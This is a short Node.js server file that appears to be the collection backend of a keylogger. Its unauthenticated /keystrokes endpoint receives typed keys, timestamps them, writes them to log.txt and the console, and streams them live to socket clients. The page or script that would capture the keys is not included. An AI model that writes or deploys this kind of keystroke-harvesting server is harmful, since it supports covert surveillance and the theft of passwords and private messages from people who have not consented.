const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const http = require("http");
const io = require("socket.io");

const app = express();
const server = http.createServer(app);
const socketServer = io(server);

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(__dirname + "/public"));

// Store keystrokes in an array
let keystrokes = [];

// Socket connection
socketServer.on("connection", (socket) => {
  console.log("Client connected");

  // Send keystrokes to the client
  socket.emit("keystrokes", keystrokes);
});

// Handle incoming keystrokes
app.post("/keystrokes", (req, res) => {
  const { key } = req.body;
  const timestamp = new Date().toLocaleString();

  // Log keystroke to console
  console.log(`${timestamp}: ${key}`);

  // Add keystroke to array
  keystrokes.push({ key, timestamp });

  // Append keystroke to log file
  fs.appendFile("log.txt", `${timestamp}: ${key}\n`, (err) => {
    if (err) {
      console.error("Error writing to log.txt:", err);
      res.status(500).send("Error writing to log file");
    } else {
      res.status(200).send("Keystroke logged successfully");
    }
  });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
